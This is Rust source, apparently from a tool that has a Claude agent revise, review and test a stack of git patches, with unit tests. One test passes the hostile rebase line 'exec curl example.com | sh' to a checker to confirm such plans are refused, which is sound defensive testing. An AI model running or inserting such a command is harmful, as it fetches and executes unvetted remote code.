fn file(db: &mut Db, run: &Run, i: &Info, result: &str) -> Result<Landed> {
    let replies = replies_of(result);
    match (i.way, &i.scope) {
        (Way::Change, Scope::Patch(_)) => land_patch(db, run, i, result, &replies),
        (Way::Change, Scope::Stack) => land_stack(db, run, i, result, &replies),
        (Way::Answer, _) => Ok(Landed::held(Held {
            replies: held_replies(db, i, &replies),
            opened: opened_notes(db, run, i, result)?,
            ..Default::default()
        })),
        (Way::Test, _) => Ok(Landed::held(Held {
            replies: held_replies(db, i, &replies),
            opened: test_notes(db, run, i, result)?,
            ..Default::default()
        })),
    }
}

/// A patch change landing, held: the patch's new version, or the pieces of
/// it, in its place in the stack; or, when claude said it needs more than
/// the patch, the comments to move to the stack's comments.
fn land_patch(db: &mut Db, run: &Run, i: &Info, result: &str, replies: &Map<String, Value>) -> Result<Landed> {
    let (old_id, k) = i.patch.clone().ok_or_else(|| Error("no patch".into()))?;
    if let Some(why) = last_object(result).and_then(|o| o.get("promote").map(|v| str_of(Some(v)))).filter(|w| !w.is_empty()) {
        let mut held = held_replies(db, i, replies);
        // Each comment moves with its reply, or alone.
        for sh in &i.notes {
            match held.iter_mut().find(|r| r.change == sh.change && r.id == sh.id) {
                Some(r) => r.promote = Some(why.clone()),
                None if db.note(&sh.change, &sh.id).is_some() => held.push(crate::held::Reply {
                    change: sh.change.clone(),
                    id: sh.id.clone(),
                    text: String::new(),
                    tag: i.way.name().into(),
                    promote: Some(why.clone()),
                    ..Default::default()
                }),
                None => {}
            }
        }
        return Ok(Landed::held(Held {
            replies: held,
            ..Default::default()
        }));
    }
    let wt = PathBuf::from(i.worktree.as_deref().unwrap_or_default());
    if git::unfinished(&wt)? {
        return Ok(Landed::failed(
            format!("the agent left work uncommitted, or a rebase half done: it is left in {}", wt.display()),
            true,
        ));
    }
    let below: Vec<&str> = i.commits[..k].iter().map(|c| c.0.as_str()).collect();
    let parent = below.last().copied().unwrap_or(i.base.as_str()).to_string();
    let now_below = git::git(&wt, &["rev-list", "--reverse", &format!("{}..{parent}", i.base)]).unwrap_or_default();
    if now_below.lines().collect::<Vec<_>>() != below {
        return Ok(Landed::failed(format!("the agent changed the patches below patch {}", k + 1), true));
    }
    let pieces = pieces_since(db, &wt, &parent, &old_id, i)?;
    if pieces.is_empty() {
        return Ok(Landed::failed(format!("nothing is left of patch {}", k + 1), true));
    }
    // A round sent back slots into the stack the work it goes on from
    // makes; any other, into the stack as it is.
    let now = db.stack(&run.stack)?.clone();
    let s = if i.on.is_some() || i.after.is_some() { started_from(db, i)? } else { now.clone() };
    let Some(at) = s.patches.iter().position(|p| *p == old_id) else {
        return Ok(Landed::failed(
            format!("patch {} changed while the agent worked on it", k + 1),
            true,
        ));
    };
    let ids: Vec<String> = pieces.iter().map(|p| p.id.clone()).collect();
    let replies = held_replies(db, i, replies);
    let mut patches = s.patches.clone();
    patches.splice(at..=at, ids.iter().cloned());
    // Nothing that accepting it would change of the stack as it is.
    if patches == now.patches {
        return Ok(Landed::held(Held {
            replies,
            ..Default::default()
        }));
    }
    for p in &pieces {
        db.add_patch(p.clone())?;
    }
    // Checked now, as it would be when accepted: nothing else changes the
    // stack until then.
    db.verify(&Stack {
        patches: patches.clone(),
        ..s.clone()
    })?;
    let op = match pieces.len() {
        1 => format!("agent: patch {}", at + 1),
        n => format!("agent: patch {} split in {n}", at + 1),
    };
    Ok(Landed::held(Held {
        stack: Some(crate::held::Change {
            patches,
            base: s.base.clone(),
            op,
            of: format!("patch {}", at + 1),
            from: None,
        }),
        replies,
        ..Default::default()
    }))
}

/// The patches the commits after `parent` in `wt` are: the one keeping its
/// commit, its diff or its title, else the first, a new version of
/// `old_id`; the rest new.
fn pieces_since(db: &Db, wt: &Path, parent: &str, old_id: &str, i: &Info) -> Result<Vec<Patch>> {
    let mail = git::git(
        wt,
        &["format-patch", "--stdout", "--no-signature", "--keep-subject", &format!("{parent}..HEAD")],
    )?;
    let drafts = parse_mbox(&mail)?;
    let by_commit: HashMap<String, String> = i.commits.iter().cloned().collect();
    let old = db.patch(old_id).clone();
    let mut pieces = plan_drafts(std::slice::from_ref(&old), drafts, &by_commit);
    // Neither its commit, its diff nor its title kept: the first commit is
    // the patch's new version all the same, the ask being on that patch.
    if !pieces.iter().any(|p| p.change == old.change)
        && let Some(first) = pieces.first_mut()
    {
        *first = crate::ops::revise(&old, crate::mbox::Draft::from(&*first));
    }
    Ok(pieces)
}

/// A stack change landing, held: the commits read back as a stack made from
/// the one the ask started from, which nothing else changes until the
/// review closes.
fn land_stack(db: &mut Db, run: &Run, i: &Info, result: &str, replies: &Map<String, Value>) -> Result<Landed> {
    let wt = PathBuf::from(i.worktree.as_deref().unwrap_or_default());
    if git::unfinished(&wt)? {
        return Ok(Landed::failed(
            format!("the agent left work uncommitted, or a rebase half done: it is left in {}", wt.display()),
            true,
        ));
    }
    let _ = run;
    let from = db.node(i.from)?.clone();
    // A round sent back goes on from the stack the work it was sent back
    // from makes: its patches the ones the commits are new versions of.
    let start = started_from(db, i)?;
    // Rebased, the stack is on the commit claude says; else on its base,
    // which must still be under it.
    let said = last_object(result).and_then(|o| o.get("base").map(|v| str_of(Some(v)))).filter(|b| !b.is_empty());
    let base = match &said {
        Some(b) => match git::git(&wt, &["rev-parse", "--verify", "--quiet", &format!("{b}^{{commit}}")]) {
            Ok(sha) => sha.trim().to_string(),
            Err(_) => return Ok(Landed::failed(format!("the agent rebased onto {b}, which is not a commit"), true)),
        },
        None => i.base.clone(),
    };
    if git::git(&wt, &["merge-base", "--is-ancestor", &base, "HEAD"]).is_err() {
        return Ok(Landed::failed(
            format!("the stack is no longer on {}, and the agent did not say onto what it went", &base[..12.min(base.len())]),
            true,
        ));
    }
    let mail = git::git(
        &wt,
        &["format-patch", "--stdout", "--no-signature", "--keep-subject", &format!("{base}..HEAD")],
    )?;
    let drafts = parse_mbox(&mail)?;
    let olds: Vec<Patch> = start.patches.iter().map(|id| db.patch(id).clone()).collect();
    let by_commit: HashMap<String, String> = i.commits.iter().cloned().collect();
    let planned = plan_drafts(&olds, drafts, &by_commit);
    let ids: Vec<String> = planned.iter().map(|p| p.id.clone()).collect();
    let replies = held_replies(db, i, replies);
    // Nothing changed of the stack it went on from: a guess's, the stack the
    // work under review makes; else the stack at `from`, which the change a
    // round carries is not.
    let was = if i.after.is_some() { &start } else { &from };
    let head_base = was.base.clone().unwrap_or_else(|| i.base.clone());
    if ids == was.patches && base == head_base {
        return Ok(Landed::held(Held {
            replies,
            ..Default::default()
        }));
    }
    let next = Stack {
        patches: ids.clone(),
        base: Some(base.clone()),
        parent: Some(i.from),
        op: if base == head_base {
            "agent: the stack".into()
        } else {
            format!("agent: rebase onto {}", &base[..12])
        },
        time: now(),
        ..from.clone()
    };
    crate::check::stack(&next, &planned.iter().collect::<Vec<_>>())?;
    for p in &planned {
        db.add_patch(p.clone())?;
    }
    Ok(Landed::held(Held {
        stack: Some(crate::held::Change {
            patches: ids,
            base: Some(base),
            op: next.op,
            of: "the stack".into(),
            from: None,
        }),
        replies,
        ..Default::default()
    }))
}

/// The comments on lines that their own change's version in `now` no
/// longer has go to the patch of `now` that has their line, as after a
/// split or a merge. How many moved.
pub(crate) fn follow_lines(db: &mut Db, olds: &[Patch], now: &[String]) -> Result<usize> {
    let patches: Vec<Patch> = now.iter().map(|id| db.patch(id).clone()).collect();
    let keys: Vec<(String, HashSet<String>)> = patches
        .iter()
        .map(|p| (p.change.clone(), crate::view::note_keys(p)))
        .collect();
    let mut moved = 0;
    for old in olds {
        let own = keys.iter().find(|(c, _)| *c == old.change);
        let notes: Vec<Note> = db.notes(&old.change).into_iter().cloned().collect();
        for n in notes {
            if n.line.is_empty() || own.is_some_and(|(_, k)| k.contains(&n.line)) {
                continue;
            }
            // A key is the change's, then the line's: put it under each other.
            let Some((_, rest)) = n.line.split_once('\0') else { continue };
            for (change, k) in &keys {
                if *change == old.change {
                    continue;
                }
                let key = format!("{}\0{rest}", mode(change));
                if k.contains(&key) {
                    let id = if n.id == n.line { key.clone() } else { n.id.clone() };
                    db.set_note(Note {
                        change: change.clone(),
                        id,
                        line: key,
                        ..n.clone()
                    })?;
                    db.set_note(Note {
                        text: String::new(),
                        ..n.clone()
                    })?;
                    moved += 1;
                    break;
                }
            }
        }
    }
    Ok(moved)
}

/// Moves comment `n` to stack `name`'s own comments, `why` claude's last
/// turn: it needs more than its patch. It waits there to be sent again.
pub fn promote(db: &mut Db, name: &str, n: &Note, why: &str) -> Result<()> {
    let moved = Moved {
        change: n.change.clone(),
        id: n.id.clone(),
        line: n.line.clone(),
        file: n.file.clone(),
        preview: n.preview.clone(),
    };
    db.set_note(Note {
        change: stack_change(name),
        id: format!("moved:{}", crate::db::short_id(&n.change, &n.id)),
        line: String::new(),
        text: append_turn(&n.text, Role::Agent, &format!("This needs more than the patch: {why}"), Some("moved")),
        moved: Some(moved),
        queued: None,
        failed: None,
        ..n.clone()
    })?;
    db.set_note(Note {
        text: String::new(),
        ..n.clone()
    })
}

/// Moves a promoted comment back where it came from.
pub fn move_back(db: &mut Db, n: &Note) -> Result<()> {
    let Some(m) = n.moved.clone() else {
        return err("it was not moved");
    };
    db.set_note(Note {
        change: m.change,
        id: m.id,
        line: m.line,
        file: m.file,
        preview: m.preview,
        moved: None,
        queued: None,
        failed: None,
        ..n.clone()
    })?;
    db.set_note(Note {
        text: String::new(),
        ..n.clone()
    })
}

/// The comments an answer opened, to file: on the lines they quote, within
/// the ask's scope, each opened by the comment that asked.
fn opened_notes(db: &Db, run: &Run, i: &Info, result: &str) -> Result<Vec<Note>> {
    let notes = parse_review_notes(result).unwrap_or_default();
    let from = db.node(i.from)?.clone();
    let asked = i.notes.first().map(|n| (n.change.clone(), n.id.clone()));
    let mut out = Vec::new();
    for (n, note) in notes.iter().enumerate() {
        let at = note
            .get("patch")
            .and_then(|v| v.as_u64().or_else(|| v.as_str()?.parse().ok()))
            .map(|n| n as usize);
        let Some(id) = at.and_then(|a| a.checked_sub(1)).and_then(|a| from.patches.get(a)) else {
            continue;
        };
        let p = db.patch(id).clone();
        if let Scope::Patch(c) = &i.scope
            && *c != p.change
        {
            continue;
        }
        let file = str_of(note.get("file"));
        let text = str_of(note.get("line"));
        let side = str_of(note.get("side")).chars().next().unwrap_or(' ');
        // No line, a file of the patch: on the file as a whole.
        let whole = text.trim().is_empty().then(|| crate::view::file_keys(&p).into_iter().find(|(f, _)| *f == file)).flatten();
        let (line, file, text) = match (whole, find_line(&note_lines(&p), &file, side, &text)) {
            (Some((f, k)), _) => (k, f.clone(), f),
            (None, Some(k)) => (k, file, text),
            (None, None) => (title_key(&p), MSG_PATH.to_string(), text),
        };
        out.push(Note {
            change: p.change.clone(),
            id: format!("agent:{}:{n}", run.id),
            line,
            text: fenced(
                "agent answer",
                &crate::refs::attach(
                    str_of(note.get("text")).trim(),
                    &crate::refs::resolved(crate::refs::of_json(note.get("refs")), Some(1), &|c| named_comment(db, i, &from.name, c)),
                ),
            ),
            file,
            preview: text.chars().take(80).collect(),
            by: Some("agent".into()),
            opened_by: asked.clone(),
            time: now(),
            ..Default::default()
        });
    }
    Ok(out)
}

/// A build and test's findings, to file on each patch's title, opened by
/// the comment that asked.
fn test_notes(db: &Db, run: &Run, i: &Info, result: &str) -> Result<Vec<Note>> {
    let found = last_object(result)
        .and_then(|o| o.get("patches").and_then(Value::as_object).cloned())
        .unwrap_or_default();
    let from = db.node(i.from)?.clone();
    let asked = i.notes.first().map(|n| (n.change.clone(), n.id.clone()));
    let mut out = Vec::new();
    for (at, id) in from.patches.iter().enumerate() {
        let Some(v) = found.get(&(at + 1).to_string()) else { continue };
        let p = db.patch(id).clone();
        if let Scope::Patch(c) = &i.scope
            && *c != p.change
        {
            continue;
        }
        out.push(Note {
            change: p.change.clone(),
            id: format!("agent:{}:test:{}", run.id, at + 1),
            line: title_key(&p),
            text: {
                let (found, refs) = crate::refs::text_and_refs(v);
                let refs = crate::refs::resolved(refs, Some(1), &|c| named_comment(db, i, &from.name, c));
                fenced("agent test", &crate::refs::attach(&format!("{} (tested @{})", found.trim(), i.from), &refs))
            },
            file: MSG_PATH.into(),
            preview: p.title().chars().take(80).collect(),
            by: Some("agent".into()),
            opened_by: asked.clone(),
            time: now(),
            ..Default::default()
        });
    }
    Ok(out)
}

/// For claude, while it changes a patch: whether the patches above still
/// apply on what is in its worktree now.
pub fn fits(db_path: &Path, id: &str) -> Result<String> {
    let db = Db::load(db_path)?;
    let run = db.run(id).ok_or_else(|| Error(format!("no run {id}")))?;
    let i = info(run).ok_or_else(|| Error(format!("run {id} is not an ask")))?;
    let (Some((old_id, k)), Some(wt)) = (i.patch.clone(), i.worktree.clone()) else {
        return err("this ask is not changing a patch");
    };
    let wt = PathBuf::from(wt);
    let parent = i.commits[..k].last().map_or(i.base.clone(), |c| c.0.clone());
    let pieces = pieces_since(&db, &wt, &parent, &old_id, &i)?;
    let from = started_from(&db, &i)?;
    let mut patches: Vec<Patch> = from.patches[..k].iter().map(|p| db.patch(p).clone()).collect();
    patches.extend(pieces);
    patches.extend(from.patches[k + 1..].iter().map(|p| db.patch(p).clone()));
    crate::check::stack(&from, &patches.iter().collect::<Vec<_>>())
        .map(|_| "fits: the patches above still apply on this change".into())
        .map_err(|e| Error(format!("does not fit: {}", e.0.trim_end_matches("; nothing changed"))))
}

/// Lands every ask whose claude is gone without its wrapper landing it (it
/// was killed), or that never started; how many.
pub fn land_orphans(db_path: &Path, db: &Db) -> usize {
    let stale: Vec<String> = db
        .live_runs()
        .into_iter()
        .filter(|r| r.ask.is_some() && r.state == RunState::Started)
        .filter(|r| match (r.pid, r.starter) {
            (Some(pid), _) => !alive(pid),
            (None, Some(starter)) => !alive(starter),
            (None, None) => now() - r.time > 120,
        })
        .map(|r| r.id.clone())
        .collect();
    stale
        .iter()
        .filter(|id| land(db_path, id, Some("killed")).is_ok())
        .count()
}

/// The type of the events a run's stream starts with: the commands run to
/// start it, before its agent writes.
const STARTING: &str = "stacked";

/// What run `id` is doing as it starts, while its agent has written
/// nothing yet: the command it runs, as one line.
pub fn starting(db: &Db, id: &str) -> Option<String> {
    let last = db.events(id).pop()?;
    (last.get("type").and_then(Value::as_str) == Some(STARTING)).then(|| str_of(last.get("text")))
}

/// The last `n` lines of what run `id`'s agent wrote, as a transcript:
/// read from the end, as it is on every redraw while the agent writes. The
/// commands run to start it come first, as `$ command`.
///
/// A turn of the agent's ends with a result, but the ask only with its
/// exit: the agent may end a turn to wait on what it started (a build in
/// the background) and go on once it is done. A result is the agent's
/// finishing only when its exit follows; one it went on after, it waited
/// there; and one that is the last, while it runs, it waits.
pub fn tail(db: &Db, id: &str, n: usize) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    // Its thinking counted as it goes: of the counts in a row, the last.
    let mut counted = false;
    // What came after, read from the end: its exit, or more of its work.
    let (mut exit, mut more) = (false, false);
    let going = db.run(id).is_some_and(running);
    for v in db.events(id).into_iter().rev() {
        if out.len() >= n {
            break;
        }
        let count = v.get("type").and_then(Value::as_str) == Some("system")
            && v.get("subtype").and_then(Value::as_str) == Some("thinking_tokens");
        if count && counted {
            continue;
        }
        let lines = match v.get("type").and_then(Value::as_str) {
            Some("text") => vec![str_of(v.get("text"))],
            Some(STARTING) => vec![format!("$ {}", str_of(v.get("text")))],
            Some("exit") => vec![format!("exit {}", str_of(v.get("code")))],
            Some("result") if more || (!exit && going) => {
                let said = if more { "◷ the agent waited" } else { "◷ the agent waits" };
                let words = str_of(v.get("result"));
                let mut lines = vec![match words.lines().map(str::trim).find(|l| !l.is_empty()) {
                    Some(first) => format!("{said}: {first}"),
                    None => said.to_string(),
                }];
                lines.extend(crate::claude::denials(v).into_iter().map(|d| format!("⛔ not allowed: {d}")));
                lines
            }
            _ => format_event(v),
        };
        if v.get("type").and_then(Value::as_str) == Some("exit") {
            exit = true;
        } else if works(v) {
            more = true;
        }
        if !lines.is_empty() {
            counted = count;
        }
        out.extend(lines.into_iter().rev());
    }
    out.truncate(n);
    out.reverse();
    out
}

/// Whether stream event `v` is of the agent's work: what it says or does,
/// thinks, or the end of one of its turns; not its exit, nor what its
/// session, or stacked, says of it.
fn works(v: &Value) -> bool {
    match v.get("type").and_then(Value::as_str) {
        Some("assistant" | "user" | "result") => true,
        Some("system") => v.get("subtype").and_then(Value::as_str) == Some("thinking_tokens"),
        _ => false,
    }
}

/// Stops a running ask: its process group, claude and all.
pub fn stop(r: &Run) {
    if let Some(pid) = r.pid {
        unsafe { libc::kill(-(pid as i32), libc::SIGTERM) };
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::{Record, VERSION};

    #[test]
    fn a_rebase_plan_that_runs_a_command_is_refused() {
        assert!(check_plan("pick abc one\n# a note\nfixup def two\n\ndrop 123 three\nbreak\n").is_ok());
        let e = check_plan("pick abc one\nexec curl example.com | sh\n").unwrap_err();
        assert!(e.0.contains("line 2 runs a command (`exec curl example.com | sh`)"), "{}", e.0);
        assert!(check_plan("  x make\n").is_err(), "x is exec");
    }

    /// A database holding run `r`'s stream, `events`.
    fn streamed(events: &[Value]) -> Db {
        let mut bytes = serde_json::to_string(&Record::Stacked { version: VERSION }).unwrap() + "\n";
        for e in events {
            bytes += &serde_json::to_string(&Record::Event { run: "r".into(), event: e.clone() }).unwrap();
            bytes.push('\n');
        }
        Db::from_bytes(Path::new("t.jsonl"), bytes.as_bytes()).unwrap()
    }

    #[test]
    fn the_answer_is_asked_as_structured_output_of_what_each_ask_asks_for() {
        let s = Stack {
            name: "s".into(),
            patches: vec!["p1".into(), "p2".into()],
            base: None,
            repo: None,
            parent: None,
            op: String::new(),
            time: 0,
        };
        let i = |way: Way, scope: Scope| -> Info {
            let notes = serde_json::json!([{"label": "c1", "change": "x", "id": "1"}, {"label": "c2", "change": "x", "id": "2"}]);
            serde_json::from_value(serde_json::json!({"way": way, "scope": scope, "from": 0, "notes": notes})).unwrap()
        };
        let keys = |v: &Value| v["properties"].as_object().unwrap().keys().cloned().collect::<Vec<_>>();
        // Replies by the comments' labels, nothing else.
        let change = answer_schema(&i(Way::Change, Scope::Stack), &s);
        assert_eq!((keys(&change), change["required"].clone()), (vec!["replies".to_string(), "base".into()], serde_json::json!(["replies"])));
        assert_eq!(keys(&change["properties"]["replies"]), ["c1", "c2"]);
        assert_eq!(change["properties"]["replies"]["additionalProperties"], false);
        assert_eq!(keys(&answer_schema(&i(Way::Change, Scope::Patch("x".into())), &s)), ["replies", "promote"]);
        // An answer's comments; a build and test's findings by the patches'
        // numbers.
        let answer = answer_schema(&i(Way::Answer, Scope::Stack), &s);
        assert_eq!(answer["properties"]["comments"]["items"]["required"], serde_json::json!(["patch", "file", "line", "text"]));
        let test = answer_schema(&i(Way::Test, Scope::Stack), &s);
        assert_eq!(keys(&test["properties"]["patches"]), ["1", "2"]);
        // What is written: a string, or one with its references.
        let written = &test["properties"]["replies"]["properties"]["c1"]["anyOf"];
        assert_eq!((written[0]["type"].clone(), written[1]["required"].clone()), (serde_json::json!("string"), serde_json::json!(["text"])));
    }

    #[test]
    fn the_answer_is_its_structured_output_when_it_gives_one() {
        let said = serde_json::json!({"type": "result", "result": "Done: {\"replies\": {\"c1\": \"as said\"}}"});
        let structured = serde_json::json!({"type": "result", "result": "", "structured_output": {"replies": {"c1": "as given"}}});
        assert_eq!(replies_of(&result_text(&[&said]))["c1"], "as said");
        assert_eq!(replies_of(&result_text(&[&said, &structured]))["c1"], "as given");
        let failed = serde_json::json!({"type": "result", "is_error": true, "subtype": "error_max_structured_output_retries"});
        assert_eq!(ended_badly(&[&failed]).as_deref(), Some("its answer never fit what it was asked for, tried again and again"));
        assert_eq!(ended_badly(&[&said]), None);
    }

    #[test]
    fn replies_are_found_after_prose_holding_braces() {
        let text = "Left: `Provider.${this.name}` @r1.\n\n```json\n{\"replies\": {\"c1\": {\"text\": \"Done.\"}}}\n```";
        assert_eq!(replies_of(text)["c1"]["text"], "Done.");
        assert!(last_object("no object { here").is_none());
        // Prose after it, braces in it too: still the answer.
        let after = format!("{text}\nThen `${{more}}`, as fn f() {{}} does.");
        assert_eq!(replies_of(&after)["c1"]["text"], "Done.");
    }

    #[test]
    fn leaving_says_where_each_agent_still_running_works() {
        let run = |id: &str, what: &str, pid: Option<u32>, state: RunState, ask: Value| Run {
            id: id.into(),
            what: what.into(),
            stack: "s".into(),
            state,
            pid,
            request: format!("why\n{id}?"),
            ask: Some(ask),
            ..Default::default()
        };
        let ask = |worktree: Option<&str>| serde_json::json!({"way": "change", "scope": "stack", "from": 0, "notes": [], "repo": "/repo", "worktree": worktree});
        let me = Some(std::process::id());
        let runs = [
            run("r1", "change", me, RunState::Started, ask(Some("/repo/.stacked/s/agent"))),
            // An answer, in the repository as it is.
            run("r2", "answer", me, RunState::Started, ask(None)),
            // Its process gone, or landed: not running.
            run("r3", "change", Some(i32::MAX as u32), RunState::Started, ask(Some("/w"))),
            run("r4", "change", me, RunState::Done, ask(Some("/w"))),
            // Being started, where it works not known yet.
            Run { starter: me, ..run("r5", "change", None, RunState::Started, ask(None)) },
        ];
        let mut bytes = serde_json::to_string(&Record::Stacked { version: VERSION }).unwrap() + "\n";
        for r in runs {
            bytes += &(serde_json::to_string(&Record::Run(r)).unwrap() + "\n");
        }
        let db = Db::from_bytes(Path::new("t.jsonl"), bytes.as_bytes()).unwrap();
        assert_eq!(
            still_running(&db),
            [
                "r1 change s \"why r1?\" works in /repo/.stacked/s/agent",
                "r2 answer s \"why r2?\" works in /repo",
                "r5 change s \"why r5?\" is being started, its worktree being made",
            ]
        );
    }

    #[test]
    fn the_stream_starts_with_the_commands_run_to_start_the_agent() {
        let step = |t: &str| serde_json::json!({"type": STARTING, "text": t});
        let mut events = vec![step("git worktree add --detach /tmp/stacked-r 750b26ffa4ae")];
        // While the agent has written nothing, what it is doing is the last
        // command, as one line.
        assert_eq!(starting(&streamed(&events), "r").as_deref(), Some("git worktree add --detach /tmp/stacked-r 750b26ffa4ae"));
        events.push(step("git am --keep-non-patch, 3 patches"));
        assert_eq!(starting(&streamed(&events), "r").as_deref(), Some("git am --keep-non-patch, 3 patches"));
        // Once it writes, it is started; the commands stay at the top of
        // what it wrote.
        events.push(serde_json::json!({"type": "system", "subtype": "init", "model": "m"}));
        let db = streamed(&events);
        assert_eq!(starting(&db, "r"), None);
        assert_eq!(
            tail(&db, "r", usize::MAX),
            ["$ git worktree add --detach /tmp/stacked-r 750b26ffa4ae", "$ git am --keep-non-patch, 3 patches", "● session started · m"]
        );
        assert_eq!(starting(&streamed(&[]), "r"), None);
    }

    #[test]
    fn the_stream_says_the_agent_is_thinking() {
        // As claude writes it, its thinking kept from the stream: counted,
        // a block with no words in it.
        let count = |n: u64| serde_json::json!({"type": "system", "subtype": "thinking_tokens", "estimated_tokens": n});
        let mut events = vec![
            serde_json::json!({"type": "system", "subtype": "dev_intent", "kind": "android_app"}),
            serde_json::json!({"type": "system", "subtype": "init", "model": "claude-opus-5-5"}),
        ];
        events.extend([50, 200, 350].map(count));
        // Thinking still: its count as it is now, one line.
        let db = streamed(&events);
        assert_eq!(tail(&db, "r", 10), ["● session started · claude-opus-5-5", "✻ thinking · ~350 tokens"]);
        events.extend([500, 688].map(count));
        events.extend([
            serde_json::json!({"type": "assistant", "message": {"content": [{"type": "thinking", "thinking": "", "signature": "x"}]}}),
            serde_json::json!({"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Bash", "input": {"command": "git status --short"}}]}}),
            serde_json::json!({"type": "user", "message": {"content": [{"type": "tool_result", "content": "clean"}]}}),
            count(120),
            count(240),
            serde_json::json!({"type": "assistant", "message": {"content": [{"type": "text", "text": "Nothing changed."}]}}),
            serde_json::json!({"type": "result", "result": "{}"}),
            serde_json::json!({"type": "exit", "code": 0}),
        ]);
        let db = streamed(&events);
        assert_eq!(
            tail(&db, "r", 20),
            [
                "● session started · claude-opus-5-5",
                "✻ thinking · ~688 tokens",
                "⚙ Bash: git status --short",
                "  ↳ clean",
                "✻ thinking · ~240 tokens",
                "Nothing changed.",
                "✓ the agent finished",
                "exit 0",
            ]
        );
        assert_eq!(tail(&db, "r", 3), ["Nothing changed.", "✓ the agent finished", "exit 0"]);
    }

    #[test]
    fn a_turn_ended_while_the_agent_runs_on_waits_and_only_its_exit_finishes() {
        let say = |text: &str| serde_json::json!({"type": "assistant", "message": {"content": [{"type": "text", "text": text}]}});
        let result = |text: &str| serde_json::json!({"type": "result", "result": text});
        // As `streamed`, its run still going: its process there.
        let going = |events: &[Value]| {
            let run = Run {
                id: "r".into(),
                state: RunState::Started,
                pid: Some(std::process::id()),
                ..Default::default()
            };
            let mut bytes = serde_json::to_string(&Record::Stacked { version: VERSION }).unwrap() + "\n";
            bytes += &(serde_json::to_string(&Record::Run(run)).unwrap() + "\n");
            for e in events {
                bytes += &(serde_json::to_string(&Record::Event { run: "r".into(), event: e.clone() }).unwrap() + "\n");
            }
            Db::from_bytes(Path::new("t.jsonl"), bytes.as_bytes()).unwrap()
        };
        // Its build started in the background, its turn over: it waits, its
        // process running on.
        let mut events = vec![say("Building."), result("\nThe build is still running.\nI will test once it ends.")];
        assert_eq!(tail(&going(&events), "r", 2), ["Building.", "◷ the agent waits: The build is still running."]);
        // Gone, nothing after it: it finished there.
        assert_eq!(tail(&streamed(&events), "r", 1), ["✓ the agent finished"]);
        // Woken by the build's end, it went on, then finished.
        events.extend([say("Built; 3 tests pass."), result("{}"), serde_json::json!({"type": "exit", "code": 0})]);
        assert_eq!(
            tail(&going(&events), "r", 5),
            ["Building.", "◷ the agent waited: The build is still running.", "Built; 3 tests pass.", "✓ the agent finished", "exit 0"]
        );
    }

    #[test]
    fn the_agent_is_told_to_point_at_the_stack_before_the_web() {
        // A web link is one of the references it may give: in the prompt,
        // as an example, and in its answer's schema.
        assert!(REFS.contains("or, to point at a page of the web, {\"url\": \"https://example.com/a/b\" (its whole address, https or http)}"), "{REFS}");
        let s = Stack {
            name: "s".into(),
            patches: vec!["p1".into()],
            base: None,
            repo: None,
            parent: None,
            op: String::new(),
            time: 0,
        };
        let notes = serde_json::json!([{"label": "c1", "change": "x", "id": "1"}]);
        let i: Info = serde_json::from_value(serde_json::json!({"way": Way::Answer, "scope": Scope::Stack, "from": 0, "notes": notes})).unwrap();
        let schema = answer_schema(&i, &s);
        let given = &schema["properties"]["replies"]["properties"]["c1"]["anyOf"][1]["properties"]["refs"]["items"]["properties"];
        assert_eq!(given.as_object().unwrap().keys().collect::<Vec<_>>(), ["file", "lines", "patch", "comment", "url"]);
        assert_eq!(schema["properties"]["comments"]["items"]["properties"]["refs"]["items"]["properties"]["url"]["type"], "string");
        // Told to point at the stack first, at lines or a comment, and at the
        // web only for what nothing of the stack's says.
        let first = REFS.find("Point at the stack first: when the code or the comments of the stack say what you mean, point at those lines").expect(REFS);
        assert!(first > REFS.find("{\"url\"").unwrap(), "{REFS}");
        assert!(
            REFS[first..].contains(
                "or at that comment, rather than at a page of the web. A web link is for what nothing in the stack, the repository or its comments says"
            ),
            "{REFS}"
        );
        // A link it gave before, said as one in the thread it is told.
        let text = append_turn("why?", Role::Agent, "See @r1.\n\n```refs\nr1 https://example.com/a\n```", Some("answer"));
        assert_eq!(transcript(&text), "The user: why?\nYou (the agent, earlier): See @r1.\n(pointing at: r1, the web link https://example.com/a)");
    }

    #[test]
    fn each_kind_of_ask_may_use_what_stacked_gives_it_then_what_the_settings_add() {
        let cmd = "stacked -f db";
        let mine = crate::config::Agent {
            change_tools: vec!["Bash(make check *)".into()],
            answer_tools: vec!["Bash(lint *)".into(), crate::setup::SKILL.into()],
            tools: vec!["mcp__moz__*".into()],
            schema: false,
            ..Default::default()
        };
        let none = crate::config::Agent { schema: false, ..Default::default() };
        // An answer is given what reads the code and the stack, nothing that
        // changes anything; curl and jq are no longer its own.
        let given = answer_given(cmd);
        assert!(given.contains("Read") && given.contains("Bash(stacked -f db comments *)"), "{given}");
        for no in ["Edit", "Write", "Bash(git commit", "Bash(git push", "Bash(git rebase", "Bash,", "curl", "jq"] {
            assert!(!given.contains(no), "{no} in {given}");
        }
        // Then its list, then every ask's; its list being curl and jq unless
        // the settings say otherwise, as they were before there were lists.
        // The skills, let answers, are theirs alone.
        assert_eq!(tools_for(Way::Answer, cmd, &mine), format!("{given},Bash(lint *),Skill,mcp__moz__*"));
        assert_eq!(tools_for(Way::Answer, cmd, &none), format!("{given},Bash(curl *),Bash(jq *)"));
        // A change: git's history, what reads, stacked's fits and export; then
        // its own list, none unless set, then every ask's.
        let change = format!("{},Bash({cmd} fits *),Bash({cmd} export *)", allowed_tools());
        assert_eq!(tools_for(Way::Change, cmd, &mine), format!("{change},Bash(make check *),mcp__moz__*"));
        assert_eq!(tools_for(Way::Change, cmd, &none), change);
        // A build and test: Bash at large, and every ask's alone.
        assert_eq!(tools_for(Way::Test, cmd, &mine), format!("Bash,{},mcp__moz__*", allowed_tools()));
        // Asked for structured output, the tool it answers with comes after
        // what stacked gives.
        let schema = tools_for(Way::Answer, cmd, &crate::config::Agent::default());
        assert_eq!(schema, format!("{given},StructuredOutput,Bash(curl *),Bash(jq *)"));
    }

    #[test]
    fn the_ask_s_effort_goes_after_the_settings_arguments_in_place_of_theirs() {
        let args = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        // The settings' arguments as they are, then the ask's effort.
        assert_eq!(at_effort(args(&["--model", "opus"]), Some(Effort::Max)), args(&["--model", "opus", "--effort", "max"]));
        // The settings' own effort, either way it is written, taken out.
        let theirs = args(&["--effort", "low", "--verbose", "--effort=medium"]);
        assert_eq!(at_effort(theirs.clone(), Some(Effort::Xhigh)), args(&["--verbose", "--effort", "xhigh"]));
        // An ask of before, with none: the settings' as they are.
